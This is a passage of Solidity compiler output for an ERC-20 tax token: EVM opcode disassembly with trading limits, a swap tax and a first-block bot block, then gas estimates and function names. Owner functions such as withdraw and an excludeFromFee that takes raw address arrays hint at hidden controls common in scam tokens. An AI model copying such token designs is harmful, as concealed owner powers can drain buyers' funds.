PUSH2 0xB09 JUMPI POP PUSH1 0x6 SLOAD PUSH2 0xB06 SWAP1 PUSH1 0xA PUSH2 0x1771 JUMP JUMPDEST NUMBER GT JUMPDEST ISZERO PUSH2 0xB16 JUMPI PUSH2 0xB16 PUSH2 0x123D JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 AND EQ DUP1 ISZERO SWAP1 PUSH2 0xB42 JUMPI POP PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST ISZERO PUSH2 0xF46 JUMPI PUSH2 0xB73 PUSH1 0x64 PUSH2 0xB6D PUSH1 0xB SLOAD PUSH1 0xE SLOAD GT PUSH2 0xB62 JUMPI PUSH1 0x7 SLOAD PUSH2 0xB66 JUMP JUMPDEST PUSH1 0x9 SLOAD JUMPDEST DUP6 SWAP1 PUSH2 0x12C5 JUMP JUMPDEST SWAP1 PUSH2 0x134E JUMP JUMPDEST PUSH1 0x14 SLOAD SWAP1 SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0xBA1 JUMPI POP PUSH1 0x13 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST ISZERO PUSH2 0xD9E JUMPI NUMBER PUSH1 0x6 SLOAD SUB PUSH2 0xC99 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND PUSH2 0xC2B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x2B PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x426F74206164647265737365732063616E6E6F742062757920696E2074686520 PUSH1 0x44 DUP3 ADD MSTORE PUSH11 0x666972737420626C6F636B PUSH1 0xA8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH2 0xC37 PUSH1 0x12 PUSH1 0xA PUSH2 0x16E8 JUMP JUMPDEST PUSH2 0xC45 SWAP1 PUSH4 0x1312D00 PUSH2 0x16F7 JUMP JUMPDEST DUP3 GT ISZERO PUSH2 0xC94 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x457863656564732074686520737761705468726573686F6C642E000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH2 0xD88 JUMP JUMPDEST PUSH1 0xF SLOAD DUP3 GT ISZERO PUSH2 0xCEB JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4578636565647320746865206D61785478416D6F756E742E0000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x10 SLOAD DUP3 PUSH2 0xD0E DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xD18 SWAP2 SWAP1 PUSH2 0x1771 JUMP JUMPDEST GT ISZERO PUSH2 0xD66 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4578636565647320746865206D617857616C6C657453697A652E000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST NUMBER PUSH1 0x6 SLOAD PUSH1 0x3 PUSH2 0xD76 SWAP2 SWAP1 PUSH2 0x1771 JUMP JUMPDEST GT ISZERO PUSH2 0xD88 JUMPI DUP3 EXTCODESIZE ISZERO PUSH2 0xD88 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0xE DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0xD98 DUP4 PUSH2 0x1784 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP JUMPDEST PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ DUP1 ISZERO SWAP1 PUSH2 0xDD5 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND ISZERO JUMPDEST ISZERO PUSH2 0xE55 JUMPI PUSH1 0x10 SLOAD DUP3 PUSH2 0xDFD DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xE07 SWAP2 SWAP1 PUSH2 0x1771 JUMP JUMPDEST GT ISZERO PUSH2 0xE55 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4578636565647320746865206D617857616C6C657453697A652E000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0xE7B JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND ADDRESS EQ ISZERO JUMPDEST ISZERO PUSH2 0xEA8 JUMPI PUSH2 0xEA5 PUSH1 0x64 PUSH2 0xB6D PUSH1 0xC SLOAD PUSH1 0xE SLOAD GT PUSH2 0xE9B JUMPI PUSH1 0x8 SLOAD PUSH2 0xB66 JUMP JUMPDEST PUSH1 0xA SLOAD DUP6 SWAP1 PUSH2 0x12C5 JUMP JUMPDEST SWAP1 POP JUMPDEST ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0xA8 SHL SWAP1 DIV PUSH1 0xFF AND ISZERO DUP1 ISZERO PUSH2 0xEDF JUMPI POP PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 AND EQ JUMPDEST DUP1 ISZERO PUSH2 0xEF4 JUMPI POP PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0xB0 SHL SWAP1 DIV PUSH1 0xFF AND JUMPDEST DUP1 ISZERO PUSH2 0xF01 JUMPI POP PUSH1 0x11 SLOAD DUP2 GT JUMPDEST DUP1 ISZERO PUSH2 0xF10 JUMPI POP PUSH1 0xD SLOAD PUSH1 0xE SLOAD GT JUMPDEST ISZERO PUSH2 0xF44 JUMPI PUSH2 0xF32 PUSH2 0xF2D DUP5 PUSH2 0xF28 DUP5 PUSH1 0x12 SLOAD PUSH2 0x1390 JUMP JUMPDEST PUSH2 0x1390 JUMP JUMPDEST PUSH2 0x10C3 JUMP JUMPDEST SELFBALANCE DUP1 ISZERO PUSH2 0xF42 JUMPI PUSH2 0xF42 SELFBALANCE PUSH2 0x13A5 JUMP JUMPDEST POP JUMPDEST POP JUMPDEST DUP1 ISZERO PUSH2 0xFC0 JUMPI ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0xF66 SWAP1 DUP3 PUSH2 0x13DF JUMP JUMPDEST ADDRESS PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 DUP2 SWAP1 KECCAK256 SWAP3 SWAP1 SWAP3 SSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP1 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH2 0xFB7 SWAP1 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0xFE3 SWAP1 DUP4 PUSH2 0x143E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SSTORE PUSH2 0x1028 PUSH2 0x1009 DUP4 DUP4 PUSH2 0x143E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 PUSH2 0x13DF JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SWAP3 SWAP1 SWAP3 SSTORE DUP6 AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH2 0x1072 DUP6 DUP6 PUSH2 0x143E JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP5 DUP5 GT ISZERO PUSH2 0x10AD JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP2 SWAP1 PUSH2 0x14AE JUMP JUMPDEST POP PUSH1 0x0 PUSH2 0x10BA DUP5 DUP7 PUSH2 0x179D JUMP JUMPDEST SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x14 DUP1 SLOAD PUSH1 0xFF PUSH1 0xA8 SHL NOT AND PUSH1 0x1 PUSH1 0xA8 SHL OR SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP3 ADD DUP4 MSTORE PUSH1 0x0 SWAP3 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP ADDRESS DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x110B JUMPI PUSH2 0x110B PUSH2 0x17B0 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x20 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x13 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x15AB88C9 PUSH1 0xE3 SHL DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP1 SWAP4 AND SWAP3 PUSH4 0xAD5C4648 SWAP3 PUSH1 0x4 DUP1 DUP4 ADD SWAP4 SWAP2 SWAP3 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1164 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1188 SWAP2 SWAP1 PUSH2 0x17C6 JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x119B JUMPI PUSH2 0x119B PUSH2 0x17B0 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x20 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD ADD MSTORE PUSH1 0x13 SLOAD PUSH2 0x11C1 SWAP2 ADDRESS SWAP2 AND DUP5 PUSH2 0x830 JUMP JUMPDEST PUSH1 0x13 SLOAD PUSH1 0x40 MLOAD PUSH4 0x791AC947 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x791AC947 SWAP1 PUSH2 0x11FA SWAP1 DUP6 SWAP1 PUSH1 0x0 SWAP1 DUP7 SWAP1 ADDRESS SWAP1 TIMESTAMP SWAP1 PUSH1 0x4 ADD PUSH2 0x17E3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1214 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1228 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x14 DUP1 SLOAD PUSH1 0xFF PUSH1 0xA8 SHL NOT AND SWAP1 SSTORE POP POP POP POP JUMP JUMPDEST PUSH2 0x1249 PUSH1 0x12 PUSH1 0xA PUSH2 0x16E8 JUMP JUMPDEST PUSH2 0x1257 SWAP1 PUSH4 0x3B9ACA00 PUSH2 0x16F7 JUMP JUMPDEST PUSH1 0xF SSTORE PUSH2 0x1266 PUSH1 0x12 PUSH1 0xA PUSH2 0x16E8 JUMP JUMPDEST PUSH2 0x1274 SWAP1 PUSH4 0x3B9ACA00 PUSH2 0x16F7 JUMP JUMPDEST PUSH1 0x10 SSTORE PUSH32 0x947F344D56E1E8C70DC492FB94C4DDDDD490C016AAB685F5E7E47B2E85CB44CF PUSH2 0x12A4 PUSH1 0x12 PUSH1 0xA PUSH2 0x16E8 JUMP JUMPDEST PUSH2 0x12B2 SWAP1 PUSH4 0x3B9ACA00 PUSH2 0x16F7 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x0 SUB PUSH2 0x12D7 JUMPI POP PUSH1 0x0 PUSH2 0x3DD JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12E3 DUP4 DUP6 PUSH2 0x16F7 JUMP JUMPDEST SWAP1 POP DUP3 PUSH2 0x12F0 DUP6 DUP4 PUSH2 0x1856 JUMP JUMPDEST EQ PUSH2 0x1347 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x21 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x536166654D6174683A206D756C7469706C69636174696F6E206F766572666C6F PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x77 PUSH1 0xF8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1347 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x1480 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 GT PUSH2 0x139F JUMPI DUP3 PUSH2 0x1347 JUMP JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 DUP3 ISZERO PUSH2 0x8FC MUL SWAP1 DUP4 SWAP1 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x581 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x13EC DUP4 DUP6 PUSH2 0x1771 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x1347 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1B PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1347 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x1089 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x14A1 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP2 SWAP1 PUSH2 0x14AE JUMP JUMPDEST POP PUSH1 0x0 PUSH2 0x10BA DUP5 DUP7 PUSH2 0x1856 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 PUSH1 0x20 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x14DC JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x14C0 JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x689 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1525 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x1530 DUP2 PUSH2 0x14FD JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1553 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 CALLDATALOAD PUSH2 0x155E DUP2 PUSH2 0x14FD JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP5 ADD CALLDATALOAD PUSH2 0x156E DUP2 PUSH2 0x14FD JUMP JUMPDEST SWAP3 SWAP6 SWAP3 SWAP5 POP POP POP PUSH1 0x40 SWAP2 SWAP1 SWAP2 ADD CALLDATALOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1591 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0x1347 DUP2 PUSH2 0x14FD JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x15AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x15C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x15D3 DUP2 PUSH2 0x14FD JUMP JUMPDEST SWAP2 POP PUSH1 0x20 DUP4 ADD CALLDATALOAD PUSH2 0x15E3 DUP2 PUSH2 0x14FD JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 JUMPDEST DUP1 DUP6 GT ISZERO PUSH2 0x163F JUMPI DUP2 PUSH1 0x0 NOT DIV DUP3 GT ISZERO PUSH2 0x1625 JUMPI PUSH2 0x1625 PUSH2 0x15EE JUMP JUMPDEST DUP1 DUP6 AND ISZERO PUSH2 0x1632 JUMPI SWAP2 DUP2 MUL SWAP2 JUMPDEST SWAP4 DUP5 SHR SWAP4 SWAP1 DUP1 MUL SWAP1 PUSH2 0x1609 JUMP JUMPDEST POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x1656 JUMPI POP PUSH1 0x1 PUSH2 0x3DD JUMP JUMPDEST DUP2 PUSH2 0x1663 JUMPI POP PUSH1 0x0 PUSH2 0x3DD JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 EQ PUSH2 0x1679 JUMPI PUSH1 0x2 DUP2 EQ PUSH2 0x1683 JUMPI PUSH2 0x169F JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP PUSH2 0x3DD JUMP JUMPDEST PUSH1 0xFF DUP5 GT ISZERO PUSH2 0x1694 JUMPI PUSH2 0x1694 PUSH2 0x15EE JUMP JUMPDEST POP POP PUSH1 0x1 DUP3 SHL PUSH2 0x3DD JUMP JUMPDEST POP PUSH1 0x20 DUP4 LT PUSH2 0x133 DUP4 LT AND PUSH1 0x4E DUP5 LT PUSH1 0xB DUP5 LT AND OR ISZERO PUSH2 0x16C2 JUMPI POP DUP2 DUP2 EXP PUSH2 0x3DD JUMP JUMPDEST PUSH2 0x16CC DUP4 DUP4 PUSH2 0x1604 JUMP JUMPDEST DUP1 PUSH1 0x0 NOT DIV DUP3 GT ISZERO PUSH2 0x16E0 JUMPI PUSH2 0x16E0 PUSH2 0x15EE JUMP JUMPDEST MUL SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1347 PUSH1 0xFF DUP5 AND DUP4 PUSH2 0x1647 JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH2 0x3DD JUMPI PUSH2 0x3DD PUSH2 0x15EE JUMP JUMPDEST PUSH1 0x20 DUP1 DUP3 MSTORE DUP2 DUP2 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x60 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1758 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 MLOAD SWAP3 POP PUSH1 0x20 DUP5 ADD MLOAD SWAP2 POP PUSH1 0x40 DUP5 ADD MLOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x3DD JUMPI PUSH2 0x3DD PUSH2 0x15EE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x1796 JUMPI PUSH2 0x1796 PUSH2 0x15EE JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x3DD JUMPI PUSH2 0x3DD PUSH2 0x15EE JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x17D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH2 0x1347 DUP2 PUSH2 0x14FD JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA0 DUP3 ADD DUP8 DUP4 MSTORE PUSH1 0x20 DUP8 PUSH1 0x20 DUP6 ADD MSTORE PUSH1 0xA0 PUSH1 0x40 DUP6 ADD MSTORE DUP2 DUP8 MLOAD DUP1 DUP5 MSTORE PUSH1 0xC0 DUP7 ADD SWAP2 POP PUSH1 0x20 DUP10 ADD SWAP4 POP PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x1835 JUMPI DUP5 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 MSTORE SWAP4 DUP4 ADD SWAP4 SWAP2 DUP4 ADD SWAP2 PUSH1 0x1 ADD PUSH2 0x1810 JUMP JUMPDEST POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP7 SWAP1 SWAP7 AND PUSH1 0x60 DUP6 ADD MSTORE POP POP POP PUSH1 0x80 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x1873 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E6365A2646970667358221220 0xB0 0x4C SWAP1 PUSH25 0x1DB138D74317E588F23795E39A5A76C9ACAD7DAA0BE50820DF PUSH23 0x362B64736F6C6343000818003300000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "1271600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"_maxTaxSwap()": "2363",
						"_maxTxAmount()": "2318",
						"_maxWalletSize()": "2362",
						"_taxSwapThreshold()": "2361",
						"addLiq()": "infinite",
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "24637",
						"balanceOf(address)": "2620",
						"decimals()": "200",
						"getSenderEtherBalance()": "2902",
						"manualSwap(uint256)": "infinite",
						"name()": "infinite",
						"openTrading()": "50856",
						"owner()": "2376",
						"renounceOwnership()": "30276",
						"symbol()": "infinite",
						"totalSupply()": "infinite",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite",
						"uniswapV2Pair()": "2404",
						"withdraw()": "infinite"
					},
					"internal": {
						"_approve(address,address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite",
						"excludeFromFee(uint256,uint160[] memory)": "infinite",
						"isContract(address)": "infinite",
						"min(uint256,uint256)": "61",
						"removeLimits()": "infinite",
						"sendETHToFee(uint256)": "infinite",
						"swapTokensForEth(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
